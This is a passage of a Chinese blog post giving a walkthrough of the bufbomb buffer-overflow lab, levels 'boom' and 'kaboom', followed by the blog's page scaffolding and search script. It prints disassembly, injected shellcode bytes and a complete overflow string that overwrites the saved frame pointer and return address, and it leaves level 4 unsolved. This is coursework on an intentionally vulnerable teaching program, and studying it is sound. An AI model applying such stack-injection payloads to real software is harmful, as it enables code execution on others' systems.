%ebp</span><br><span class="line"> 8048c7b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c7d:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048c80:	e8 48 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c85:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048c88:	e8 b5 06 00 00       	call   8049342 &lt;getbuf&gt;</span><br><span class="line"> 8048c8d:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048c90:	e8 38 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c95:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c97:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048c9a:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c9c:	74 12                	je     8048cb0 &lt;test+0x36&gt;</span><br><span class="line"> 8048c9e:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048ca1:	68 d0 a3 04 08       	push   $0x804a3d0</span><br><span class="line"> 8048ca6:	e8 65 fc ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048cab:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cae:	eb 41                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cb0:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048cb3:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048cb8:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048cba:	75 22                	jne    8048cde &lt;test+0x64&gt;</span><br><span class="line"> 8048cbc:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048cbf:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048cc2:	68 f9 a3 04 08       	push   $0x804a3f9</span><br><span class="line"> 8048cc7:	e8 74 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048ccc:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048ccf:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048cd2:	6a 03                	push   $0x3</span><br><span class="line"> 8048cd4:	e8 e6 07 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048cd9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cdc:	eb 13                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cde:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ce1:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048ce4:	68 16 a4 04 08       	push   $0x804a416</span><br><span class="line"> 8048ce9:	e8 52 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048cee:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cf1:	90                   	nop</span><br><span class="line"> 8048cf2:	c9                   	leave  </span><br><span class="line"> 8048cf3:	c3                   	ret</span><br></pre></td></tr></table></figure>
+
+<p>程序先调用test函数,然后在test函数中调用getbuf函数后返回test函数(0x8048c8d的位置),同时修改getbuf返回值为cookie的值,我们首先应该获得将getbuf返回值修改为cookie和返回test两个操作的机器码,同样,通过编译和反汇编: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x5754bf83,%eax  //将cookie的值赋予寄存器eax</span><br><span class="line">push   $0x8048c8d  //返回地址0x8048c8d</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wz4hbwpdj30j4063dgf.jpg" alt="6.png"></p>
+<p>我们获得了上面代码的机器码：</p>
+<p><strong>b8 83 bf 54 57 68 8d 8c 04 08 c3</strong></p>
+<p>我们调整getbuf返回地址的时候是通过覆盖前面的内容实现的,所以我们现在需要把-0xc(%ebp)的值取出来,还原回去.同样,通过gdb设置断点:</p>
+<p>gdb bufbomb</p>
+<p>break getbuf</p>
+<p>run –u 17100021048</p>
+<p>p/x <strong>(int</strong>)($ebp)</p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzfxesj9j30hn06laar.jpg" alt="7.png"></p>
+<p>得到地址<strong>0x55683570</strong></p>
+<p>则我们要组成的机器码为</p>
+<p>b8 83 bf 54 57 68 8d 8c 04 08 c3 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 <strong>70 35 68 55</strong> 1e 35 68 55</p>
+<p>（11位机器码+39位任意数+<strong>4位ebp的内容</strong>+4位返回getbuf地址）<br>机器码保存成boom.txt文档，测试一下</p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzibq5sjj30kk03oaae.jpg" alt="8.png"></p>
+<p>完成</p>
+<h3 id="Level-4-kaboom"><a href="#Level-4-kaboom" class="headerlink" title="Level 4: kaboom"></a>Level 4: kaboom</h3><p>首先注意：你需要使用“-n”命令行开关运行bufbomb程序（”Nitro”模式），以便进行本级别实验。<br>本级别实验的任务与前一级别相同，即构造一攻击字符串使得getbufn函数返回cookie值至testn函数，而不是返回值1。 具体来说，你的攻击字符串应将函数返回值设为cookie值，复原/清除所有被破坏的状态，将正确的返回位置压入栈中，并执行ret指令以返回testn函数。 然而，在Nitro模式下运行时，bufbomb使用你的攻击字符串执行5次getbufn函数，每次采用不同的栈偏移位置。你的攻击字符串必须使程序每次均能返回cookie值。</p>
+<p>我们先来看一下这个testn代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048cf4 &lt;testn&gt;:</span><br><span class="line"> 8048cf4:	55                   	push   %ebp</span><br><span class="line"> 8048cf5:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048cf7:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048cfa:	e8 ce 03 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048cff:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048d02:	e8 57 06 00 00       	call   804935e &lt;getbufn&gt;</span><br><span class="line"> 8048d07:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048d0a:	e8 be 03 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048d0f:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048d11:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048d14:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048d16:	74 12                	je     8048d2a &lt;testn+0x36&gt;</span><br><span class="line"> 8048d18:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048d1b:	68 d0 a3 04 08       	push   $0x804a3d0</span><br><span class="line"> 8048d20:	e8 eb fb ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048d25:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d28:	eb 41                	jmp    8048d6b &lt;testn+0x77&gt;</span><br><span class="line"> 8048d2a:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048d2d:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048d32:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048d34:	75 22                	jne    8048d58 &lt;testn+0x64&gt;</span><br><span class="line"> 8048d36:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d39:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048d3c:	68 34 a4 04 08       	push   $0x804a434</span><br><span class="line"> 8048d41:	e8 fa fa ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048d46:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d49:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048d4c:	6a 04                	push   $0x4</span><br><span class="line"> 8048d4e:	e8 6c 07 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048d53:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d56:	eb 13                	jmp    8048d6b &lt;testn+0x77&gt;</span><br><span class="line"> 8048d58:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d5b:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048d5e:	68 54 a4 04 08       	push   $0x804a454</span><br><span class="line"> 8048d63:	e8 d8 fa ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048d68:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d6b:	90                   	nop</span><br><span class="line"> 8048d6c:	c9                   	leave  </span><br><span class="line"> 8048d6d:	c3                   	ret</span><br></pre></td></tr></table></figure>
+
+<p>在0x08048d02处设置断点，查看ebp和esp内容:</p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzm4l3wej30ip08eq3w.jpg" alt="9.png"></p>
+<p>我们可以发现$ebp=$esp+0x18, %esp在getbufn结束后并没有改变.所以,我们恢复被我们覆盖掉的ebp时,就可以通过movl  0x28(%esp),%ebp执行!我们还要把getbufn的返回值从1修改为我们的cookie,最后跳转到testn执行完getbufn的后一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl      $0x5754bf83,%eax                 //将cookie赋给eax作为getbuf返回值</span><br><span class="line">lea      0x18(%esp),%ebp                   //将ebp寄存器的内容恢复(原来被我们覆盖)</span><br><span class="line">pushl     $08048d02                            //返回testn中getbufn调用后的下一条语句</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzmwca0pj30il074q3q.jpg" alt="10.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:	b8 83 bf 54 57       	mov    $0x5754bf83,%eax</span><br><span class="line"> 5:	8d 6c 24 18          	lea    0x18(%esp),%ebp</span><br><span class="line"> 9:	68 02 8d 04 08       	push   $0x8048d02</span><br><span class="line"> e:	c3                   	ret</span><br></pre></td></tr></table></figure>
+
+<p>得到机器码</p>
+<p><strong>b8 83 bf 54 57 8d 6c 24 18 68 02 8d 04 08 c3</strong></p>
+<p>getbufn代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0804935e &lt;getbufn&gt;:</span><br><span class="line"> 804935e:	55                   	push   %ebp</span><br><span class="line"> 804935f:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049361:	81 ec c8 02 00 00    	sub    $0x2c8,%esp</span><br><span class="line"> 8049367:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804936a:	8d 85 3e fd ff ff    	lea    -0x2c2(%ebp),%eax</span><br><span class="line"> 8049370:	50                   	push   %eax</span><br><span class="line"> 8049371:	e8 98 fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049376:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049379:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804937e:	c9                   	leave  </span><br><span class="line"> 804937f:	c3                   	ret</span><br></pre></td></tr></table></figure>
+
+<p>帧指针申请了0x2c2的空间存放bufn,也就是706.所以数组长度为706字节.然后是4字节覆盖ebp内容,然后是4位getbufn返回地址(我们应该调整为buf的首地址,这样就可以执行我们上面反汇编出来的机器码).最后我们要解决的问题就是拿到buf的首地址，但是每次的地址都不同.不管了，我们先看看能找到什么。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzopcikaj30i60oen05.jpg" alt="11.png"></p>
+<p>嗯，，，这个真的不懂了，尝试一些都没做出来，大家加油。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Little left
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/09/11/LAB3：缓冲区溢出攻击/" title="LAB3：缓冲区溢出攻击">http://yoursite.com/2019/09/11/LAB3：缓冲区溢出攻击/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/10/Lab2-二进制炸弹/" rel="next" title="Lab2:二进制炸弹">
+                <i class="fa fa-chevron-left"></i> Lab2:二进制炸弹
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/blog-logo.jpg" alt="Little left">
+            
+              <p class="site-author-name" itemprop="name">Little left</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验介绍"><span class="nav-number">1.</span> <span class="nav-text">实验介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验内容"><span class="nav-number">2.</span> <span class="nav-text">实验内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-0-smoke"><span class="nav-number">2.1.</span> <span class="nav-text">Level 0: smoke</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-1-fizz"><span class="nav-number">2.2.</span> <span class="nav-text">Level 1: fizz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-2-bang"><span class="nav-number">2.3.</span> <span class="nav-text">Level 2: bang</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-3-boom"><span class="nav-number">2.4.</span> <span class="nav-text">Level 3: boom</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-4-kaboom"><span class="nav-number">2.5.</span> <span class="nav-text">Level 4: kaboom</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Little left</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+  <div class="powered-by">
+   <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+     本站访客数:<span id="busuanzi_value_site_uv"></span>
+   </span>
+  </div>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由  强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">
+  主题 &mdash;
+   v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
